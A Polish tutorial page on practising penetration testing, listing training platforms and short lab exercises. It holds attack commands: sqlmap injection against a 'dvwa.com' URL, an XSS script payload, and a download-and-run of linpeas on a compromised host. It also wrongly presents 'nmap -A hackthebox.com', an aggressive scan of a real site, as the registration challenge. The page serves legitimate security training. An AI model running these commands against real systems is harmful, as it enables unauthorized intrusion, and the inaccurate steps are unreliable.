---
id: "case-studies-practice"
title: "🛠️ Case Studies i ćwiczenia praktyczne"
sidebar_position: 18
---

# 🛠️ Case Studies i ćwiczenia praktyczne

Testowanie aplikacji w kontrolowanym środowisku to najlepszy sposób na naukę testów penetracyjnych. W tej sekcji omówimy platformy do ćwiczeń, laby pentesterskie oraz przykłady rzeczywistych scenariuszy ataków.

---

## 🎯 Platformy do ćwiczeń i laby pentesterskie

### **1️⃣ Hack The Box (HTB)**
Hack The Box to jedna z najpopularniejszych platform dla pentesterów. Oferuje realistyczne maszyny w różnych kategoriach:
- **Easy** – dobre dla początkujących
- **Medium** – zawierają bardziej złożone ataki
- **Hard** – wymagające pełnej analizy systemu

Aby uzyskać dostęp, należy rozwiązać wyzwanie rejestracyjne: 
```bash
nmap -A hackthebox.com
```
Po uzyskaniu konta można łączyć się z VPN HTB i atakować maszyny:
```bash
openvpn htb.ovpn
```
Więcej na: [https://www.hackthebox.com/](https://www.hackthebox.com/)

---

### **2️⃣ TryHackMe**
TryHackMe to interaktywna platforma z kursami pentestingu i praktycznymi labami.

Polecane ścieżki:
- **Pre Security** – dla osób zaczynających w cyberbezpieczeństwie
- **Web Fundamentals** – ataki na aplikacje webowe
- **Offensive Pentesting** – testy penetracyjne w praktyce

Dostęp do maszyn:
```bash
openvpn tryhackme.ovpn
```
Więcej na: [https://tryhackme.com/](https://tryhackme.com/)

---

### **3️⃣ PentesterLab**
PentesterLab oferuje kursy oparte na rzeczywistych podatnościach. Każdy scenariusz obejmuje eksploitację podatności z wykorzystaniem narzędzi takich jak:
- Burp Suite
- SQLMap
- Metasploit

Ścieżki do ćwiczeń:
- **Web for Pentester** – podstawowe ataki webowe
- **Advanced Web** – ataki na JWT, SSRF, XXE
- **Exploitation** – wykorzystywanie znanych exploitów

Więcej na: [https://pentesterlab.com/](https://pentesterlab.com/)

---

## 🔥 Ćwiczenia na realnych scenariuszach

### **4️⃣ SQL Injection na podatnej aplikacji**
Testowanie SQLi na **Damn Vulnerable Web Application (DVWA)**:
```bash
sqlmap -u "http://dvwa.com/vuln.php?id=1" --dbs
```

### **5️⃣ XSS w OWASP Juice Shop**
Zainstaluj aplikację:
```bash
docker run -d -p 3000:3000 bkimminich/juice-shop
```
Testowanie XSS:
```javascript
<script>alert('XSS')</script>
```

### **6️⃣ Eskalacja uprawnień na Linuksie**
Uruchomienie `linpeas` na zhakowanej maszynie:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### **7️⃣ Przechwytywanie ruchu w Burp Suite**
1. Skonfiguruj Burp jako proxy.
2. Przechwyć żądanie logowania.
3. Edytuj wartości sesji i przetestuj IDOR.

---

## 🛡️ Jak maksymalnie wykorzystać platformy pentesterskie?
✅ **Dokumentuj każdy test** – zapisuj użyte narzędzia i payloady.
✅ **Analizuj logi i odpowiedzi serwera** – ucz się na błędach.
✅ **Próbuj różnych metod ataku** – nie ograniczaj się do jednego narzędzia.
✅ **Nie korzystaj ze skryptów „gotowców” bez zrozumienia** – ucz się, jak działają.

---

Ćwiczenia w kontrolowanych środowiskach to najlepszy sposób na naukę pentestingu. Kolejnym krokiem będzie **Analiza rzeczywistych incydentów i exploitacji**! 🚀
